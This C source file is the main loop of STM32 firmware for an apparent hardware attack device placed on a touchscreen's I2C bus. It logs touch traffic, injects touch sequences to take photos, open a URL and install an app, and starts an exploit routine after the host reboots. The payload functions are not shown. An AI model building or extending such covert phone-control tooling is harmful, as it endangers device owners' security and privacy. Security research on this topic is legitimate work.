#include "main.h"

#include <stdio.h>
#include "string.h"

#include "touch_logger_with_timer.h"
#include "touch_injector.h"

void setup(void)
{
	HAL_Init();
	SystemClock_Config();
	GPIO_Config();
	USART2_Config();
	BSP_LED_Init(LED3);
	I2C_Config();
	HAL_Delay(100);
	printf("\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n");
	printf("------------------------------------------------\r\n-----------------------Hello--------------------\r\n------------------------------------------------\r\n");
	HAL_Delay(100);
	BSP_LED_Toggle(LED3);
	HAL_Delay(100);
	BSP_LED_Toggle(LED3);
	HAL_Delay(100);
	BSP_LED_Toggle(LED3);
	HAL_Delay(100);
	BSP_LED_Toggle(LED3);
}

void passThroughLoggerListen(void)
{
	init_logger();

	for(int i=0; i<500; i++)
	{
		i2cListenOnce();
	}

	destroy_logger();
}

void passThroughLoggerWithTimerListen(uint32_t timer_timeout, uint8_t stop_on_reboot)
{
	logger_with_timer_init(timer_timeout, stop_on_reboot);

	while(logger_with_timer_completed() == 0)
	{
		i2cListenOnce();
	}

	logger_with_timer_destroy();

}

void askDataExploit(void)
{
	init_exploit();

	while(1)
	{
		i2cListenOnce();
		exploitLoopActions();
	}

	destroy_exploit();
}

void askDataInjection(enum injection_types type)
{
	printf("%s in\r\n", __FUNCTION__);
	base_injector_init(type);

	while(base_injector_is_injection_complete() == 0)
	{
		i2cListenOnce();
	}

	base_injector_destroy();
	printf("%s out\r\n", __FUNCTION__);
}


enum abilities
{
	ABILITY_PHOTO,
	ABILITY_URL,
	ABILITY_APP,
	ABILITY_EXPLOIT
};

static uint8_t abilities_shown[] = {0,0,0,0};
int main(void)
{
	setup();

	while(1)
	{
		printf("Abilities shown: ");
		for(uint8_t i=0; i<sizeof(abilities_shown); i++)
		{
			printf("%d ", abilities_shown[i]);
		}
		printf("\r\n");

		printf("Waiting...\r\n");
		if(abilities_shown[ABILITY_PHOTO] && abilities_shown[ABILITY_APP])
		{
			passThroughLoggerWithTimerListen(1000000, 1);
		}
		else
		{
			passThroughLoggerWithTimerListen(1000000, 0);
		}

		printf("Done waiting, logger_with_timer_was_timer_triggered = %d logger_with_timer_was_woken = %d logger_with_timer_was_reboot=%d\r\n", logger_with_timer_was_timer_triggered(), logger_with_timer_was_woken(), logger_with_timer_was_reboot());
		if(logger_with_timer_was_reboot())
		{
			printf("Exploiting\r\n");
			askDataExploit();
		}
		else if(logger_with_timer_was_woken())
		{
			HAL_Delay(500);
			if(!abilities_shown[ABILITY_PHOTO])
			{
				printf("Showing ability photo\r\n");
				askDataInjection(INJECTION_PHOTO);
				abilities_shown[ABILITY_PHOTO] = 1;
			//}
			//else if (!abilities_shown[ABILITY_APP])
			//{
				passThroughLoggerWithTimerListen(5000, 0);

				printf("Showing ability app\r\n");
				askDataInjection(INJECTION_APP);
				abilities_shown[ABILITY_APP] = 1;
			}
		}
		else if(logger_with_timer_was_timer_triggered() == 0)
		{
			askDataInjection(INJECTION_URL);
		}
	}
}


void Error_Handler(void)
{
	while(1)
	{
		BSP_LED_Toggle(LED3);
		HAL_Delay(1000);
	}
}




/************************ (C) COPYRIGHT STMicroelectronics *****END OF FILE****/
